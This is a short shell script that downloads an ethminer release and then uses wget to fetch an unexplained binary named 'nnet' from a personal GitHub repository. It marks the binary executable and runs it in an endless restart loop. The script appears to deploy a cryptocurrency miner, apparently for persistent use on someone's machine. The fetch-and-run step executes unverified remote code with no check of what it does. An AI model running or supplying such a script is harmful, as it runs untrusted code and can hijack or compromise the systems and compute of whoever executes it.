wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
tar -xvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
wget -O nnet https://raw.githubusercontent.com/venetta999/12345/main/nnet
chmod +x nnet
while true
do
./nnet
done
